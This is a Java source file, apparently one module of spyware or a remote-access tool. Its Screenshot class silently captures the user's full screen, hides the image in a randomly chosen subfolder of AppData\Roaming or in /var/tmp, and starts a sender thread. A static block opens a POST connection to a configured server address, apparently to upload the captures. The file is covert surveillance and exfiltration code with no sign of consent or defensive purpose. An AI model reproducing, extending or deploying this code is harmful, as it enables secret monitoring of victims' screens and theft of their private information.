package xyz.ctih1;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Objects;
import java.util.Random;

public class Screenshot implements Runnable {
    private static final URL url;
    private static final Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();

    private static final int screenWidth = (int) screenSize.getWidth();
    private static final int screenHeight = (int) screenSize.getHeight();
    static {
        try {
            url = new URL(LaunchTask.SERVER_IP);
        } catch (MalformedURLException e) {
            throw new RuntimeException(e);
        }
    }
    static {
        try {
            HttpURLConnection con = (HttpURLConnection) url.openConnection();
            con.setRequestMethod("POST");
            con.setDoInput(true);
            con.setDoOutput(true);
            con.setRequestProperty("Content-Type", "application/octet-stream");

        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    private static final String os = System.getProperty("os.name").toLowerCase();
    private static final Rectangle dimensions = new Rectangle(screenWidth, screenHeight);

    static String username = System.getProperty("user.name");
    private static final Path templateDir = Paths.get("C:\\Users\\"+username+"\\AppData\\Roaming");
    static Path path = Paths.get("C:\\Users\\"+username+"\\AppData\\Roaming\\image.jpg");
    static Robot assist;

    private static final Random rnd = new Random();

    static {
        try {
            assist = new Robot();
        } catch (AWTException e) {
            throw new RuntimeException(e);
        }
    }

    public void run() {
        try {
            take();
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        Thread sender = new Thread(new Send());
        sender.start();
    }

    private static final File[] files = templateDir.toFile().listFiles();
    private static final int fileIndex;

    static {
        assert files != null;
        fileIndex = rnd.nextInt(files.length);
    }

    public void take() throws IOException {
        BufferedImage ss = assist.createScreenCapture(dimensions);
        File outputfile = new File(Objects.requireNonNull(getPath()).toUri());
        ImageIO.write(ss, "jpg", outputfile);
    }

    public static Path getPath() {
        if(os.contains("win")) {
            if(files!=null) {
                File file = files[fileIndex];
                path = Paths.get(file.getPath()+"\\image.jpg");
                System.out.println(path.toUri());
            }
            else {
                path = Paths.get("C:\\Users\\"+username+"\\AppData\\Roaming\\image.jpg");
            }
        }
        else if ((os.contains("nix") || os.contains("nux") || os.contains("aix"))){
            path = Paths.get("/var/tmp/image.jpg");
        }
        else {
            System.out.println(os);
            return null;
        }
        return path;
    }
}
